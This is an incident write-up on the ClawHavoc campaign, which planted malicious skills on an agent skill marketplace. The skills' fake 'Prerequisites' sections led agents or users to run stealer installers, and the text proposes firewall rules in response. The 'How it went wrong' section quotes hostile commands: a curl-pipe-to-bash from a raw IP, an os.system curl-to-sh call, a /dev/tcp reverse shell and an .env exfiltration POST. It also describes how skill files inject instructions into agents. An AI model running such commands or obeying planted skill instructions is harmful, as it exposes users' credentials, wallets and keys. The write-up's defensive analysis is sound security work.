# ClawHavoc poisoned an agent skill marketplace with stealer payloads behind fake "prerequisites"

- Date: 2026-02 | Agent/tool: OpenClaw agent and the ClawHub skill marketplace (ClawHavoc campaign) | Axis: mcp

## What happened

Koi Security published on 2026-02-01 an audit of every skill on ClawHub, the community marketplace where OpenClaw agents pick up new capabilities. Of 2,857 skills, 341 were malicious, and 335 of them came from one coordinated campaign: ClawHavoc. The skills disguised themselves as Solana and Phantom wallet tools, Polymarket bots, YouTube utilities, Google Workspace integrations, and typosquats of the `clawhub` CLI itself (29 variants). An update on 2026-02-16 raised the count to 824 malicious skills as the marketplace grew past 10,700 entries. The mechanism generalizes beyond OpenClaw: any agent that loads third-party skill or slash-command files will read instructions from them and act.

## How it went wrong

The skill's documentation looks professional. Its "Prerequisites" section tells the agent (or the user following the agent's summary) that a helper is required before the skill works. On Windows it links a password-protected ZIP, which defeats automated scanning. On macOS it points to a snippet on glot.io and says to paste it into Terminal: an `echo` of a fake official URL, then a base64 line that decodes to `/bin/bash -c "$(curl -fsSL http://91.92.242.30/...)"`. The fetched script downloads a second stage into `$TMPDIR`, strips quarantine with `xattr -c`, sets the executable bit with `chmod +x`, and runs it. The payload is Atomic macOS Stealer (AMOS), a 521 KB universal Mach-O binary that steals keychain passwords, browser data, more than 60 cryptocurrency wallets, Telegram sessions, SSH keys and shell history. Two outliers show other shapes: `better-polymarket` hid `os.system("curl -s http://54.91.154.110:13338/|sh")` inside working code, and the command it served was a `/dev/tcp` reverse shell back to the attacker. `rankaj` simply read `~/.clawdbot/.env` and POSTed it to webhook.site.

## What the firewall should learn

Every stage is visible as an ordinary OS event. The paste-payload shape is already covered by the builtin `network.download.pipe-to-interpreter` and `process.encoded.base64-to-shell` rules, and the reverse shell by `network.shell.reverse-shell`. The genuine gaps: first, file_open with write=true into the agent's own skill and command directories (`~/.openclaw/**`, `~/.claude/**`, `.claude/commands/**`), which should be approval_required because a file there is executable-by-instruction. Second, the correlation of a freshly read skill file with the exec of its prerequisite: an agent-descendant running `curl`/`bash` to a raw IP shortly after reading a skill from its marketplace directory deserves at least approval_required. Third, reads of the agent's own `.env` followed by an external POST are a secret-exfil pattern no builtin rule matches.

## Sources

- [Koi Security: ClawHavoc — 341 Malicious Skills Found by the Bot They Were Targeting](https://www.koi.ai/blog/clawhavoc-341-malicious-clawedbot-skills-found-by-the-bot-they-were-targeting)
- [Snyk: How a Malicious Google Skill on ClawHub Tricks Users Into Installing Malware](https://snyk.io/blog/clawhub-malicious-google-skill-openclaw-malware/)
- [The Hacker News: Researchers Find 341 Malicious ClawHub Skills Stealing Data](https://thehackernews.com/2026/02/researchers-find-341-malicious-clawhub.html)
- [Unit 42: OpenClaw's Skill Marketplace and the Emerging AI Supply Chain Threat](https://unit42.paloaltonetworks.com/openclaw-ai-supply-chain-risk/)
